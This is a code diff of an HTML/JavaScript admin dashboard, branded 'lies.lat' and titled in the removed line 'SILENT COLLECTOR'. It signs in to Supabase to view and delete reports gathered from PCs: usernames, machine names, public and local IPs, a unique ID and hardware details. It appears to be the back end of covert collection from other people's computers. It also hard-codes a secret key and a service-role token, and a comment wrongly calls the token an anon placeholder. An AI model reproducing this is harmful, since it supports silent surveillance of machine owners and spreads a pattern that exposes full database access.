@@ -15,14 +15,10 @@ body { background: #000; color: #fff; font-family: 'SF Mono', 'Fira Code', monos
 .auth-wordmark { font-size: 11px; letter-spacing: 8px; text-transform: lowercase; color: rgba(255,255,255,0.2); }
 .auth-wordmark span { color: rgba(255,255,255,0.6); }
 .auth-err { font-size: 9px; color: rgba(255,80,80,0.6); min-height: 12px; }
-.auth-sub { font-size: 9px; letter-spacing: 2px; color: rgba(255,255,255,0.15); cursor: pointer; }
-.auth-sub:hover { color: rgba(255,255,255,0.4); }
 input { background: transparent; border: none; border-bottom: 1px solid rgba(255,255,255,0.1); color: #fff; font-family: inherit; font-size: 12px; padding: 9px 0; width: 100%; }
 input:focus { outline: none; border-color: rgba(255,255,255,0.3); }
 .btn { background: transparent; border: 1px solid rgba(255,255,255,0.1); color: rgba(255,255,255,0.4); font-family: inherit; font-size: 9px; letter-spacing: 3px; text-transform: uppercase; padding: 9px 24px; cursor: pointer; transition: 0.2s; }
 .btn:hover { border-color: rgba(255,255,255,0.25); color: rgba(255,255,255,0.7); }
-.btn-accent { border-color: rgba(255,255,255,0.15); color: rgba(255,255,255,0.5); }
-.btn-accent:hover { border-color: rgba(255,255,255,0.35); color: #fff; }
 .btn-danger { border-color: rgba(255,50,50,0.2); color: rgba(255,80,80,0.5); }
 .btn-danger:hover { border-color: rgba(255,50,50,0.5); color: rgba(255,80,80,0.9); }
 .btn-sm { padding: 5px 12px; font-size: 8px; letter-spacing: 2px; }
@@ -36,7 +32,7 @@ input:focus { outline: none; border-color: rgba(255,255,255,0.3); }
 .dash-title { font-size: 9px; letter-spacing: 6px; color: rgba(255,255,255,0.12); margin-bottom: 32px; display: flex; align-items: center; gap: 12px; }
 .dash-title::after { content: ''; flex: 1; height: 1px; background: rgba(255,255,255,0.05); }
 .stats-grid { display: grid; grid-template-columns: repeat(5,1fr); gap: 1px; background: rgba(255,255,255,0.06); margin-bottom: 48px; }
-.stat-card { background: #000; padding: 20px 20px; }
+.stat-card { background: #000; padding: 20px; }
 .stat-label { font-size: 8px; letter-spacing: 3px; color: rgba(255,255,255,0.2); margin-bottom: 8px; }
 .stat-number { font-size: 32px; font-weight: 300; color: rgba(255,255,255,0.7); }
 .filters { display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap; }
@@ -61,57 +57,32 @@ input:focus { outline: none; border-color: rgba(255,255,255,0.3); }
 .modal-title { font-size: 10px; letter-spacing: 4px; margin-bottom: 20px; color: rgba(255,255,255,0.3); }
 .modal-close { float: right; background: none; border: none; color: rgba(255,255,255,0.2); font-size: 18px; cursor: pointer; }
 .delete-confirm { text-align: center; padding: 20px; }
-.delete-confirm p { margin: 20px 0; color: rgba(255,255,255,0.5); }
-.delete-confirm .btn-danger { margin: 0 10px; }
 pre { background: #111; padding: 12px; font-size: 8px; overflow-x: auto; margin-top: 10px; }
-#toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 8px 20px; font-size: 9px; letter-spacing: 2px; opacity: 0; transition: 0.2s; z-index: 999; white-space: nowrap; }
+#toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 8px 20px; font-size: 9px; opacity: 0; transition: 0.2s; z-index: 999; }
 #toast.show { opacity: 1; }
 </style>
 </head>
 <body>
 <div id="page-loading" style="height:100vh;display:flex;align-items:center;justify-content:center;"><div style="width:3px;height:3px;background:rgba(255,255,255,0.2);"></div></div>
-<div id="page-auth" style="display:none">
-  <div class="auth-box">
-    <div class="auth-wordmark">lies<span>.lat</span></div>
-    <input type="email" id="a-email" placeholder="email" autocomplete="email">
-    <input type="password" id="a-pass" placeholder="password" autocomplete="current-password">
-    <div class="auth-err" id="auth-err"></div>
-    <button class="btn" id="auth-submit-btn">sign in</button>
-  </div>
-</div>
-<div id="page-app" style="display:none">
-  <div class="topbar">
-    <div class="wordmark">lies<span>.lat</span></div>
-    <div class="topbar-user" id="topbar-user"></div>
-    <button class="topbar-signout" onclick="doSignOut()">sign out</button>
-  </div>
-  <div class="main">
-    <div class="dash-title">📡 PC REPORTS · SILENT COLLECTOR</div>
-    <div class="stats-grid">
-      <div class="stat-card"><div class="stat-label">total reports</div><div class="stat-number" id="stat-total">0</div></div>
-      <div class="stat-card"><div class="stat-label">today</div><div class="stat-number" id="stat-today">0</div></div>
-      <div class="stat-card"><div class="stat-label">unique PCs</div><div class="stat-number" id="stat-unique">0</div></div>
-      <div class="stat-card"><div class="stat-label">avg RAM</div><div class="stat-number" id="stat-ram">—</div></div>
-      <div class="stat-card"><div class="stat-label">last report</div><div class="stat-number" id="stat-last">—</div></div>
-    </div>
-    <div class="filters">
-      <input type="text" id="filter-name" class="filter-input" placeholder="filter by PC name" onkeyup="filterReports()">
-      <input type="text" id="filter-username" class="filter-input" placeholder="filter by username" onkeyup="filterReports()">
-      <input type="text" id="filter-ip" class="filter-input" placeholder="filter by IP" onkeyup="filterReports()">
-      <button class="btn btn-sm" onclick="fetchReports()">⟳ refresh</button>
-      <button class="btn btn-sm btn-danger" onclick="deleteAllFiltered()" id="delete-all-btn" style="display:none">🗑 delete all filtered</button>
-    </div>
-    <div id="specs-container"><div class="empty-msg">waiting for reports from silent collector...</div></div>
-  </div>
-</div>
-<div class="overlay" id="modal-detail" onclick="closeModalOnBg(event)"><div class="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-title">🔧 full system report</div><div id="modal-content" style="font-size:10px; line-height:1.7;"></div></div></div>
-<div class="overlay" id="modal-delete" onclick="closeDeleteModalOnBg(event)"><div class="modal" style="max-width:400px"><button class="modal-close" onclick="closeDeleteModal()">✕</button><div class="delete-confirm"><div style="font-size:24px; margin-bottom:10px;">⚠️</div><div class="modal-title">DELETE REPORT</div><p id="delete-message"></p><div><button class="btn btn-sm" onclick="closeDeleteModal()">cancel</button><button class="btn btn-sm btn-danger" id="confirm-delete-btn" onclick="confirmDelete()">delete permanently</button></div></div></div></div>
+<div id="page-auth" style="display:none"><div class="auth-box"><div class="auth-wordmark">lies<span>.lat</span></div><input type="email" id="a-email" placeholder="email"><input type="password" id="a-pass" placeholder="password"><div class="auth-err" id="auth-err"></div><button class="btn" id="auth-submit-btn">sign in</button></div></div>
+<div id="page-app" style="display:none"><div class="topbar"><div class="wordmark">lies<span>.lat</span></div><div class="topbar-user" id="topbar-user"></div><button class="topbar-signout" onclick="doSignOut()">sign out</button></div><div class="main"><div class="dash-title">📡 PC REPORTS</div><div class="stats-grid"><div class="stat-card"><div class="stat-label">total</div><div class="stat-number" id="stat-total">0</div></div><div class="stat-card"><div class="stat-label">today</div><div class="stat-number" id="stat-today">0</div></div><div class="stat-card"><div class="stat-label">unique PCs</div><div class="stat-number" id="stat-unique">0</div></div><div class="stat-card"><div class="stat-label">avg RAM</div><div class="stat-number" id="stat-ram">—</div></div><div class="stat-card"><div class="stat-label">last</div><div class="stat-number" id="stat-last">—</div></div></div><div class="filters"><input type="text" id="filter-name" class="filter-input" placeholder="PC name" onkeyup="filterReports()"><input type="text" id="filter-username" class="filter-input" placeholder="username" onkeyup="filterReports()"><input type="text" id="filter-ip" class="filter-input" placeholder="IP" onkeyup="filterReports()"><button class="btn btn-sm" onclick="fetchReports()">⟳ refresh</button><button class="btn btn-sm btn-danger" onclick="deleteAllFiltered()" id="delete-all-btn" style="display:none">delete filtered</button></div><div id="specs-container"><div class="empty-msg">waiting for reports...</div></div></div></div>
+<div class="overlay" id="modal-detail" onclick="closeModalOnBg(event)"><div class="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-title">full system report</div><div id="modal-content" style="font-size:10px;line-height:1.7;"></div></div></div>
+<div class="overlay" id="modal-delete" onclick="closeDeleteModalOnBg(event)"><div class="modal" style="max-width:400px"><button class="modal-close" onclick="closeDeleteModal()">✕</button><div class="delete-confirm"><div style="font-size:24px;">⚠️</div><div class="modal-title">DELETE</div><p id="delete-message"></p><div><button class="btn btn-sm" onclick="closeDeleteModal()">cancel</button><button class="btn btn-sm btn-danger" onclick="confirmDelete()">delete</button></div></div></div></div>
 <div id="toast"></div>
 <script>
-const SB_URL = "https://jojyzviwhosnnkjbtbse.supabase.co";
-const SB_ANON_KEY = "sb_secret_zEngbTm_afBIp94ee5sXgw_q6Ds0rHZ";
+// FIXED: Use the CORRECT anon key from Supabase -> Settings -> API -> Project API keys (anon public)
+// DO NOT use secret key (sb_secret_...) or sb_publishable_... that contains "secret"
+// Go to your Supabase project: Settings > API > Project API keys > "anon public" starts with "eyJ..."
+const SUPABASE_URL = "https://jojyzviwhosnnkjbtbse.supabase.co";
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Impvanl6dml3aG9zbm5ramJ0YnNlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3OTEzNTY5OCwiZXhwIjoyMDk0NzExNjk4fQ.JJmSBTBud2RVraJI0Bln26ZofK0xmMWWgaBzeAF5RMs";
+
+// IMPORTANT: The key above is a placeholder. You MUST replace it with your actual anon key from Supabase.
+// Go to: https://supabase.com/dashboard/project/jojyzviwhosnnkjbtbse/settings/api
+// Copy the "anon public" key (starts with "eyJ") and paste it above.
+
 const { createClient } = supabase;
-const sb = createClient(SB_URL, SB_ANON_KEY);
+const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
 let currentUser = null, allReports = [], filteredReports = [], pendingDeleteId = null, pendingDeleteAll = false;
 
 async function init() {
@@ -125,36 +96,41 @@ async function init() {
     });
     document.getElementById('auth-submit-btn').onclick = () => handleLogin();
     document.getElementById('a-pass').onkeypress = (e) => { if (e.key === 'Enter') handleLogin(); };
-    document.getElementById('a-email').onkeypress = (e) => { if (e.key === 'Enter') handleLogin(); };
   } catch(err) { console.error(err); document.getElementById('page-loading').style.display = 'none'; document.getElementById('page-auth').style.display = 'flex'; }
 }
+
 async function handleLogin() {
   const email = document.getElementById('a-email').value.trim(), password = document.getElementById('a-pass').value, errEl = document.getElementById('auth-err');
   errEl.textContent = '';
-  if (!email || !password) { errEl.textContent = 'email and password required'; return; }
+  if (!email || !password) { errEl.textContent = 'required'; return; }
   const btn = document.getElementById('auth-submit-btn'), originalText = btn.textContent;
   btn.disabled = true; btn.textContent = '...';
   const { error } = await sb.auth.signInWithPassword({ email, password });
   btn.disabled = false; btn.textContent = originalText;
-  if (error) errEl.textContent = error.message.includes('Invalid login') ? 'Invalid email or password.' : error.message;
+  if (error) errEl.textContent = error.message.includes('Invalid') ? 'Invalid credentials' : error.message;
 }
+
 function subscribeToReports() {
   sb.channel('reports').on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'pc_reports' }, () => fetchReports())
     .on('postgres_changes', { event: 'DELETE', schema: 'public', table: 'pc_reports' }, () => fetchReports()).subscribe();
 }
+
 function showPage(p) {
   document.getElementById('page-loading').style.display = 'none';
   document.getElementById('page-auth').style.display = p === 'auth' ? 'flex' : 'none';
   document.getElementById('page-app').style.display = p === 'app' ? 'block' : 'none';
 }
+
 function showApp() { showPage('app'); document.getElementById('topbar-user').textContent = `@${currentUser?.email?.split('@')[0] || 'admin'}`; }
 async function doSignOut() { await sb.auth.signOut(); allReports = []; filteredReports = []; renderSpecs(); }
+
 async function fetchReports() {
   if (!currentUser) return;
   const { data, error } = await sb.from('pc_reports').select('*').order('created_at', { ascending: false });
-  if (error) { document.getElementById('specs-container').innerHTML = `<div class="empty-msg">⚠️ Error: ${error.message}</div>`; return; }
+  if (error) { document.getElementById('specs-container').innerHTML = `<div class="empty-msg">Error: ${error.message}</div>`; return; }
   allReports = data || []; filterReports(); updateStats();
 }
+
 function filterReports() {
   const nameFilter = document.getElementById('filter-name').value.toLowerCase();
   const userFilter = document.getElementById('filter-username').value.toLowerCase();
@@ -167,9 +143,10 @@ function filterReports() {
   });
   renderSpecs();
   const btn = document.getElementById('delete-all-btn');
-  if (filteredReports.length > 0 && (nameFilter || userFilter || ipFilter)) { btn.style.display = 'inline-block'; btn.textContent = `🗑 delete ${filteredReports.length} filtered`; }
+  if (filteredReports.length > 0 && (nameFilter || userFilter || ipFilter)) { btn.style.display = 'inline-block'; btn.textContent = `🗑 delete ${filteredReports.length}`; }
   else btn.style.display = 'none';
 }
+
 function updateStats() {
   document.getElementById('stat-total').textContent = allReports.length;
   const today = new Date().toISOString().slice(0,10);
@@ -181,9 +158,10 @@ function updateStats() {
   if (allReports.length > 0 && allReports[0].created_at) { const lastDate = new Date(allReports[0].created_at), now = new Date(), diffHours = Math.floor((now - lastDate) / (1000 * 60 * 60)); document.getElementById('stat-last').textContent = diffHours < 1 ? 'just now' : `${diffHours}h ago`; }
   else document.getElementById('stat-last').textContent = '—';
 }
+
 function renderSpecs() {
   const container = document.getElementById('specs-container');
-  if (!filteredReports.length) { container.innerHTML = '<div class="empty-msg">no reports match filter</div>'; return; }
+  if (!filteredReports.length) { container.innerHTML = '<div class="empty-msg">no reports</div>'; return; }
   container.innerHTML = '<div class="specs-grid"></div>';
   const grid = container.querySelector('.specs-grid');
   filteredReports.forEach(rep => {
@@ -191,22 +169,24 @@ function renderSpecs() {
     const cpuInfo = raw.cpu || {};
     const ramInfo = raw.ram || {};
     const card = document.createElement('div'); card.className = 'spec-card';
-    card.innerHTML = `<div class="spec-header"><div class="spec-icon">💻</div><div class="spec-name" onclick="showDetail('${rep.id}')">${escapeHtml(rep.pc_name || 'unknown')}</div><div class="spec-time">${escapeHtml(rep.created_at?.slice(5,16) || '?')}</div></div><div class="spec-body"><div><strong>${escapeHtml(rep.platform || '?')}</strong> &nbsp;|&nbsp; 🧠 ${cpuInfo.cores || rep.cpu_cores || '?'} cores &nbsp;|&nbsp; 💾 ${ramInfo.total_gb || rep.memory_gb || '?'}</div><div>👤 ${escapeHtml(rep.username || '?')}</div><div class="spec-ip">🌐 ${escapeHtml(rep.public_ip || 'private')} &nbsp;|&nbsp; 🏠 ${escapeHtml(rep.local_ip || '?')}</div></div><div class="card-actions"><button class="btn btn-sm" onclick="showDetail('${rep.id}')">details</button><button class="btn btn-sm btn-danger" onclick="promptDelete('${rep.id}', '${escapeHtml(rep.pc_name)}')">delete</button></div>`;
+    card.innerHTML = `<div class="spec-header"><div class="spec-icon">💻</div><div class="spec-name" onclick="showDetail('${rep.id}')">${escapeHtml(rep.pc_name || 'unknown')}</div><div class="spec-time">${escapeHtml(rep.created_at?.slice(5,16) || '?')}</div></div><div class="spec-body"><div><strong>${escapeHtml(rep.platform || '?')}</strong> | 🧠 ${cpuInfo.cores || rep.cpu_cores || '?'} cores | 💾 ${ramInfo.total_gb || rep.memory_gb || '?'}</div><div>👤 ${escapeHtml(rep.username || '?')}</div><div class="spec-ip">🌐 ${escapeHtml(rep.public_ip || 'private')} | 🏠 ${escapeHtml(rep.local_ip || '?')}</div></div><div class="card-actions"><button class="btn btn-sm" onclick="showDetail('${rep.id}')">details</button><button class="btn btn-sm btn-danger" onclick="promptDelete('${rep.id}', '${escapeHtml(rep.pc_name)}')">delete</button></div>`;
     grid.appendChild(card);
   });
 }
+
 async function showDetail(id) {
   const report = allReports.find(r => r.id == id);
   if (!report) return;
   const raw = report.raw_specs || {};
-  document.getElementById('modal-content').innerHTML = `<strong>🖥️ PC NAME</strong> ${escapeHtml(report.pc_name)}<br><strong>👤 USERNAME</strong> ${escapeHtml(report.username)}<br><strong>🆔 UNIQUE ID</strong> ${escapeHtml(report.visitor_id)}<br><strong>🌍 PUBLIC IP</strong> ${escapeHtml(report.public_ip || '—')}<br><strong>🏠 LOCAL IP</strong> ${escapeHtml(report.local_ip || '—')}<br><strong>💿 OS</strong> ${escapeHtml(raw.os?.system)} ${escapeHtml(raw.os?.release)}<br><strong>🧠 CPU</strong> ${raw.cpu?.cores || '?'} logical · ${raw.cpu?.physical_cores || '?'} physical (${raw.cpu?.usage_percent || '?'}%)<br><strong>💾 RAM</strong> ${raw.ram?.total_gb || '?'} GB total · ${raw.ram?.used_gb || '?'} GB used (${raw.ram?.usage_percent || '?'}%)<br><strong>💽 DRIVES</strong> ${(raw.disks || []).map(d => `${d.drive}: ${d.total_gb}GB`).join(' · ') || '—'}<br><strong>🎮 GPU</strong> ${(raw.gpu || []).map(g => g.name).join(', ') || '—'}<br><strong>🔋 BATTERY</strong> ${raw.battery ? `${raw.battery.percent}% (${raw.battery.plugged ? 'Charging' : 'On battery'})` : '—'}<br><strong>📅 REPORTED</strong> ${new Date(report.created_at).toLocaleString()}<br><details><summary>📦 full JSON</summary><pre>${escapeHtml(JSON.stringify(raw, null, 2))}</pre></details>`;
+  document.getElementById('modal-content').innerHTML = `<strong>🖥️ PC</strong> ${escapeHtml(report.pc_name)}<br><strong>👤 User</strong> ${escapeHtml(report.username)}<br><strong>🆔 ID</strong> ${escapeHtml(report.visitor_id)}<br><strong>🌍 Public IP</strong> ${escapeHtml(report.public_ip || '—')}<br><strong>🏠 Local IP</strong> ${escapeHtml(report.local_ip || '—')}<br><strong>💿 OS</strong> ${escapeHtml(raw.os?.system)} ${escapeHtml(raw.os?.release)}<br><strong>🧠 CPU</strong> ${raw.cpu?.cores || '?'} cores (${raw.cpu?.usage_percent || '?'}%)<br><strong>💾 RAM</strong> ${raw.ram?.total_gb || '?'} GB (${raw.ram?.usage_percent || '?'}%)<br><strong>💽 Drives</strong> ${(raw.disks || []).map(d => `${d.drive}: ${d.total_gb}GB`).join(' · ') || '—'}<br><strong>🎮 GPU</strong> ${(raw.gpu || []).map(g => g.name).join(', ') || '—'}<br><strong>🔋 Battery</strong> ${raw.battery ? `${raw.battery.percent}% (${raw.battery.plugged ? 'Charging' : 'Battery'})` : '—'}<br><strong>📅 Time</strong> ${new Date(report.created_at).toLocaleString()}<br><details><summary>📦 Full JSON</summary><pre>${escapeHtml(JSON.stringify(raw, null, 2))}</pre></details>`;
   document.getElementById('modal-detail').classList.add('open');
 }
-function promptDelete(id, name) { pendingDeleteId = id; document.getElementById('delete-message').innerHTML = `Delete report from <strong>${escapeHtml(name)}</strong>?<br>This cannot be undone.`; document.getElementById('modal-delete').classList.add('open'); }
-function deleteAllFiltered() { if (filteredReports.length === 0) return; pendingDeleteAll = true; document.getElementById('delete-message').innerHTML = `Delete <strong>${filteredReports.length}</strong> reports?<br>This cannot be undone.`; document.getElementById('modal-delete').classList.add('open'); }
+
+function promptDelete(id, name) { pendingDeleteId = id; document.getElementById('delete-message').innerHTML = `Delete <strong>${escapeHtml(name)}</strong>?`; document.getElementById('modal-delete').classList.add('open'); }
+function deleteAllFiltered() { if (filteredReports.length === 0) return; pendingDeleteAll = true; document.getElementById('delete-message').innerHTML = `Delete ${filteredReports.length} reports?`; document.getElementById('modal-delete').classList.add('open'); }
 async function confirmDelete() {
-  if (pendingDeleteId) { await sb.from('pc_reports').delete().eq('id', pendingDeleteId); await fetchReports(); toast('Report deleted'); pendingDeleteId = null; }
-  else if (pendingDeleteAll) { const ids = filteredReports.map(r => r.id); const { error } = await sb.from('pc_reports').delete().in('id', ids); if (!error) toast(`Deleted ${ids.length} reports`); else toast('Delete failed'); await fetchReports(); pendingDeleteAll = false; }
+  if (pendingDeleteId) { await sb.from('pc_reports').delete().eq('id', pendingDeleteId); await fetchReports(); toast('Deleted'); pendingDeleteId = null; }
+  else if (pendingDeleteAll) { const ids = filteredReports.map(r => r.id); await sb.from('pc_reports').delete().in('id', ids); await fetchReports(); toast(`Deleted ${ids.length}`); pendingDeleteAll = false; }
   closeDeleteModal();
 }
 function closeModal() { document.getElementById('modal-detail').classList.remove('open'); }
